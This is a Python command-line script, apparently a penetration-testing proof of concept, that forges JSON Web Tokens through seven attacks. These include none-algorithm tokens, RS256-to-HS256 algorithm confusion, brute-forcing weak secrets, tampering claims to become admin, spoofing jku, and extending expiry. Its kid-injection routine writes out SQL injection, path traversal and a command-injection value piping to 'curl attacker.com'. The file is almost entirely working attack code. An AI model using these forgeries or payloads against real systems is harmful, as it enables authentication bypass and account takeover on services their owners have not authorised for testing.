#!/usr/bin/env -S python3 -I
"""
JWT Attack Toolkit — VAPT PoC
Generates attack tokens for common JWT vulnerabilities.

Usage:
  python jwt_attacks.py none-alg    -t <token>
  python jwt_attacks.py alg-confuse -t <token> -k <public_key_file>
  python jwt_attacks.py brute       -t <token> [-w wordlist.txt]
  python jwt_attacks.py claim-tamper -t <token> -s <secret> --claims '{"sub":"admin"}'
  python jwt_attacks.py kid-inject  -t <token> -s <secret>
  python jwt_attacks.py jku-spoof   -t <token> --jku-url <attacker_url>
  python jwt_attacks.py exp-bypass  -t <token> -s <secret>
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import os


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s)


def split_token(token: str):
    parts = token.strip().split(".")
    if len(parts) != 3:
        sys.exit("[!] Invalid JWT — expected 3 parts")
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts


def sign_hs256(header: dict, payload: dict, secret: str) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(secret.encode(), f"{h}.{p}".encode(), hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ---------- Attack: none algorithm ----------
def attack_none(token: str):
    header, payload, _ = split_token(token)
    print(f"[*] Original header: {json.dumps(header)}")
    print(f"[*] Original payload: {json.dumps(payload)}")

    results = []
    for alg in ["none", "None", "NONE", "nOnE"]:
        header["alg"] = alg
        h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
        p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
        results.append(f"{h}.{p}.")

    print("\n[+] None-algorithm tokens:")
    for t in results:
        print(t)
    return results


# ---------- Attack: Algorithm Confusion (RS256 → HS256) ----------
def attack_alg_confusion(token: str, pubkey_file: str):
    header, payload, _ = split_token(token)
    print(f"[*] Original alg: {header.get('alg')}")

    with open(pubkey_file, "rb") as f:
        pubkey = f.read()

    header["alg"] = "HS256"
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    sig = hmac.new(pubkey, f"{h}.{p}".encode(), hashlib.sha256).digest()
    forged = f"{h}.{p}.{b64url_encode(sig)}"

    print(f"\n[+] Forged token (RS256→HS256 using public key as secret):")
    print(forged)
    return forged


# ---------- Attack: Secret Brute-Force ----------
def attack_brute(token: str, wordlist: str = None):
    _, _, parts = split_token(token)
    msg = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])

    default_secrets = [
        "secret", "password", "123456", "admin", "key", "jwt_secret",
        "changeme", "test", "1234", "mysecret", "s3cr3t", "default",
        "qwerty", "letmein", "token", "jwt", "hmac", "hs256",
        "supersecret", "iloveyou", "passw0rd", "welcome", "abc123",
    ]

    secrets = default_secrets
    if wordlist and os.path.isfile(wordlist):
        with open(wordlist, "r", errors="ignore") as f:
            secrets = [line.strip() for line in f if line.strip()]

    print(f"[*] Brute-forcing with {len(secrets)} candidates...")
    for s in secrets:
        sig = hmac.new(s.encode(), msg, hashlib.sha256).digest()
        if hmac.compare_digest(sig, target_sig):
            print(f"[+] SECRET FOUND: {s}")
            return s

    print("[-] Secret not found in wordlist")
    return None


# ---------- Attack: Claim Tampering ----------
def attack_claim_tamper(token: str, secret: str, claims: str):
    header, payload, _ = split_token(token)
    new_claims = json.loads(claims)
    payload.update(new_claims)

    print(f"[*] Tampered payload: {json.dumps(payload, indent=2)}")
    forged = sign_hs256(header, payload, secret)
    print(f"\n[+] Forged token:")
    print(forged)
    return forged


# ---------- Attack: kid Injection ----------
def attack_kid_inject(token: str, secret: str):
    header, payload, _ = split_token(token)

    attacks = []

    # SQLi in kid
    header_sqli = dict(header)
    header_sqli["kid"] = "' UNION SELECT 'secret' -- "
    attacks.append(("SQLi (secret literal)", sign_hs256(header_sqli, payload, "secret")))

    # Path traversal in kid
    header_path = dict(header)
    header_path["kid"] = "/dev/null"
    attacks.append(("Path traversal (/dev/null → empty key)", sign_hs256(header_path, payload, "")))

    # Command injection in kid
    header_cmdi = dict(header)
    header_cmdi["kid"] = "key.pem | curl attacker.com"
    attacks.append(("Command injection", sign_hs256(header_cmdi, payload, secret)))

    print("[+] kid injection tokens:")
    for desc, t in attacks:
        print(f"\n  [{desc}]")
        print(f"  {t}")
    return attacks


# ---------- Attack: jku Spoofing ----------
def attack_jku_spoof(token: str, jku_url: str):
    header, payload, _ = split_token(token)

    header["jku"] = jku_url
    header["alg"] = "HS256"

    print(f"[*] Set jku to: {jku_url}")
    print("[*] Host a JWKS at that URL with your key")
    print("[*] Generate: python -c \"import json; print(json.dumps({'keys':[{'kty':'oct','k':'<base64_secret>'}]}))\"")

    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    forged = f"{h}.{p}.<sign_with_your_key>"
    print(f"\n[+] Forged header+payload (sign with your hosted key):")
    print(forged)
    return forged


# ---------- Attack: Expiry Bypass ----------
def attack_exp_bypass(token: str, secret: str):
    header, payload, _ = split_token(token)

    import time
    payload["exp"] = int(time.time()) + 86400 * 365
    payload["iat"] = int(time.time())
    if "nbf" in payload:
        payload["nbf"] = int(time.time()) - 60

    forged = sign_hs256(header, payload, secret)
    print("[+] Token with expiry set to 1 year from now:")
    print(forged)
    return forged


def main():
    parser = argparse.ArgumentParser(description="JWT Attack Toolkit")
    parser.add_argument("attack", choices=[
        "none-alg", "alg-confuse", "brute", "claim-tamper",
        "kid-inject", "jku-spoof", "exp-bypass"
    ])
    parser.add_argument("-t", "--token", required=True, help="Target JWT")
    parser.add_argument("-k", "--key", help="Public key file (for alg-confuse)")
    parser.add_argument("-s", "--secret", help="Known/found secret", default="secret")
    parser.add_argument("-w", "--wordlist", help="Wordlist for brute-force")
    parser.add_argument("--claims", help="JSON claims to inject (claim-tamper)")
    parser.add_argument("--jku-url", help="Attacker-controlled JKU URL")

    args = parser.parse_args()

    dispatch = {
        "none-alg":     lambda: attack_none(args.token),
        "alg-confuse":  lambda: attack_alg_confusion(args.token, args.key),
        "brute":        lambda: attack_brute(args.token, args.wordlist),
        "claim-tamper": lambda: attack_claim_tamper(args.token, args.secret, args.claims),
        "kid-inject":   lambda: attack_kid_inject(args.token, args.secret),
        "jku-spoof":    lambda: attack_jku_spoof(args.token, args.jku_url),
        "exp-bypass":   lambda: attack_exp_bypass(args.token, args.secret),
    }
    dispatch[args.attack]()


if __name__ == "__main__":
    main()
